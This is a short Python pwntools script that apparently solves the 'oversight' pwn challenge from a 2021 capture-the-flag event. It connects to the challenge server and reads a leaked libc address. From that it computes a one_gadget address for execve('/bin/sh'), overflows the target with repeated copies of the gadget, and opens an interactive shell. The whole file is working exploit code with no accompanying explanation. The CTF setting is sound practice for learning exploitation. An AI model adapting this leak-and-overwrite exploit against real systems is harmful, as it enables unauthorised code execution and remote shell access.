from pwn import *

s = remote('pwn-2021.duc.tf', 31909)
#s = process('./oversight')

#raw_input('DEBUG')

s.sendline(b'')

s.sendlineafter(b'Pick a number: ', b'27')
s.recvuntil(b'is: ')

libc_start_main_leak = int(s.recvline().strip().decode('utf-8'), 16)
print(hex(libc_start_main_leak))

'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
'''

libc_base = libc_start_main_leak - 0x0000000000021bf7
one_gadget = libc_base + 0x4f3d5

print(hex(libc_base))
print(hex(one_gadget))

s.sendlineafter(b'(max 256)? ', b'256')

payload = p64(one_gadget) * 32

s.sendline(payload)

s.interactive()
